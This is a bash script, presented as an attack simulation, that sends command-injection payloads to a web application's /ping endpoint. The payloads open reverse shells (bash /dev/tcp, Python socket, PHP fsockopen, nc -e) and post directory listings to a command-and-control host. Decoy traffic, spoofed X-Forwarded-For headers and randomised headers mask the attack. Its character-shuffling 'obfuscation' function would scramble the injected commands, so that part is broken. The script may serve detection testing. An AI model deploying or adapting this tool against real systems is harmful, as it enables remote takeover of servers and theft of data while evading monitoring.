#!/bin/bash


TARGET="http://____"
C2_SERVER="192.168.63.169"
C2_PORT="1234"
SLEEP_MIN=5
SLEEP_MAX=15
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"


random_sleep() {
    local delay=$((RANDOM % (SLEEP_MAX - SLEEP_MIN + 1) + SLEEP_MIN))
    sleep $delay
}

obfuscate_command() {
    local cmd="$1"
    echo "$cmd" | sed 's/\(.\)/\1 /g' | tr ' ' '\n' | shuf | tr -d '\n'
}

send_malicious_request() {
    local payload
    case $((RANDOM % 4)) in
        0) payload=";$(obfuscate_command "/usr/bin/curl -X POST -d \"data=\$(ls -la)\" http://$C2_SERVER:$C2_PORT")";;
        1) payload="|$(obfuscate_command "bash -c 'exec 5<>/dev/tcp/$C2_SERVER/$C2_PORT;cat <&5|while read line;do \$line 2>&5 >&5;done'")";;
        2) payload="&$(obfuscate_command "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$C2_SERVER\",$C2_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")";;
        3) payload="%0A$(obfuscate_command "php -r '\$sock=fsockopen(\"$C2_SERVER\",$C2_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")";;
    esac

    local headers=(
        "-H 'X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))'"
        "-H 'User-Agent: $USER_AGENT'"
        "-H 'Accept-Language: en-US,en;q=0.9'"
        "-H 'Referer: https://google.com'"
    )

    local random_header=${headers[$RANDOM % ${#headers[@]}]}

    /usr/bin/curl --connect-timeout 8 --max-time 10 -X POST \
        "$TARGET/ping" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        $random_header \
        --data-urlencode "website=8.8.8.8${payload}" \
        --silent --output /dev/null
}

legitimate_traffic() {
    local methods=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS")
    local paths=("/ping" "/admin" "/api" "/health" "/profile" "/upload" "/data" "/images" "/static/main.css" "/js/app.js")
    local status_codes=("200" "301" "302" "400" "401" "403" "404" "500")

    for i in {1..5}; do
        local method=${methods[$RANDOM % ${#methods[@]}]}
        local path=${paths[$RANDOM % ${#paths[@]}]}
        local code=${status_codes[$RANDOM % ${#status_codes[@]}]}

        case $method in
            "POST"|"PUT"|"PATCH")
                /usr/bin/curl -X "$method" "$TARGET$path" \
                    -d "{\"param\":\"value$RANDOM\"}" \
                    -H "Content-Type: application/json" \
                    -H "User-Agent: $USER_AGENT" \
                    -H "X-Request-ID: $(uuidgen)" \
                    --silent --output /dev/null
                ;;
            *)
                /usr/bin/curl -X "$method" "$TARGET$path" \
                    -H "User-Agent: $USER_AGENT" \
                    -H "X-Request-ID: $(uuidgen)" \
                    --silent --output /dev/null
                ;;
        esac

        random_sleep
    done
}


echo "[*] Starting simulated attack..."

legitimate_traffic
send_malicious_request
legitimate_traffic

case $((RANDOM % 3)) in
    0) CMD="nc -e /bin/sh $C2_SERVER $C2_PORT";;
    1) CMD="bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1";;
    2) CMD="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$C2_SERVER\",$C2_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";;
esac

/usr/bin/curl -X POST "$TARGET/ping" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: $USER_AGENT" \
    --data-urlencode "website=8.8.8.8; $CMD" \
    --silent --output /dev/null &

echo "[*] Attack simulation complete"
